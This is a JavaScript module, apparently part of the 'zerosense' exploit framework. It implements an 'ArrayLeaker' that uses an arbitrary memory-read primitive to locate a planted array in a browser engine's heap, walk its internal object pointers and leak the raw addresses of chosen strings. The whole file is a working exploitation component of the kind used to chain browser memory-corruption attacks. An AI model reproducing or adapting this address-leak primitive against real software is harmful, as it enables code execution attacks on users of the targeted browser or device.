var Util = require('zerosense/Util');

class ArrayLeaker {
	
	constructor(memoryReader) {
		this.memoryReader = memoryReader;
	}
	
	createArray(length, verifyString) {
		this.array = new Array(length + 1);
		this.array[0] = verifyString;
	}
	
	getArray() {
		return this.array;
	}
	
	setAddress(address) {
		this.address = address;
	}
	
	verify() {
		var str = this.memoryReader.read(this.address, 0xc);
		if (str.charCodeAt(1) !== this.array.length || str.charCodeAt(3) !== this.array.length
			|| str.charCodeAt(5) > this.array.length || str.charCodeAt(0) !== 0
			|| str.charCodeAt(2) !== 0 || str.charCodeAt(4) !== 0) {
			return false;
		}
		
		str = this.memoryReader.read(this.address + 0x18, 0x8);
		if (str.charCodeAt(0) !== 0xffff || str.charCodeAt(1) !== 0xfffe
			|| str.charCodeAt(2) === 0 || str.charCodeAt(3) === 0) {
			return false;
		}
		
		var addrStrObjPtr = Util.getint32(str.substr(2, 2));
		if (addrStrObjPtr < 0x80000000 || 0x8fffffff < addrStrObjPtr) {
			return false;
		}
		
		str = this.memoryReader.read(addrStrObjPtr + 0x8, 4);
		var addrStrObj = Util.getint32(str);
		if (addrStrObj < 0x80000000 || 0x8fffffff < addrStrObj) {
			return false;
		}
		
		str = this.memoryReader.read(addrStrObj + 0x18, 4);
		var addrStr = Util.getint32(str);
		if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
			return false;
		}
		
		str = this.memoryReader.read(addrStr, this.array[0].length * 2);
		if (str !== this.array[0]) {
			return false;
		}
		
		return true;
	}
	
	setString(index, string) {
		this.array[index + 1] = string;
	}
	
	getString(index) {
		return this.array[index + 1];
	}
	
	getStringAddress(index) {
		if (!this.verify()) {
			logger.error("ArrayLeaker array is no longer valid!");
			return null;
		}
		
		var str = this.memoryReader.read(this.address + 0x20 + 0x8 * index, 0x8);
		if (str.charCodeAt(0) !== 0xffff || str.charCodeAt(1) !== 0xfffe
			|| str.charCodeAt(2) === 0 || str.charCodeAt(3) === 0) {
			return null;
		}
		
		var addrCellPtr = Util.getint32(str.substr(2, 2));
		if (addrCellPtr < 0x80000000 || 0x8fffffff < addrCellPtr) {
			return null;
		}
		
		str = this.memoryReader.read(addrCellPtr + 0x8, 0x4);
		var addrValue = Util.getint32(str);
		if (addrValue < 0x80000000 || 0x8fffffff < addrValue) {
			return null;
		}
		
		str = this.memoryReader.read(addrValue, 0x40);
		var addrStr = null;
		var ptr1 = Util.getint32(str.substr(10, 2));
		if (ptr1 !== 0) {
			// TODO: Look at this case more in depth
			
			// Longer string
			// Could break, not 100% sure on this
			
			var addr2 = Util.getint32(str.substr(10, 2));
			if (addr2 < 0x80000000 || 0x8fffffff < addr2) {
				return null;
			}
			
			str = this.memoryReader.read(addr2 + 0x18, 0x4);
			var addr3 = Util.getint32(str);
			if (addr3 < 0x80000000 || 0x8fffffff < addr3) {
				return null;
			}
			
			for (var i = 0; i < 0x220; i++) {
				str = this.memoryReader.read(addr3 + i, this.array[index + 1].length * 2);
				if (str === this.array[index + 1]) {
					addrStr = addr3 + i;
					break;
				}
			}
		} else {
			// Shorter string
			addrStr = Util.getint32(str.substr(12, 2));
			
			if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
				return null;
			}
			
			str = this.memoryReader.read(addrStr, this.array[index + 1].length * 2);
			if (str !== this.array[index + 1]) {
				return null;
			}
		}
		
		return addrStr;
	}
	
}

module.exports = ArrayLeaker;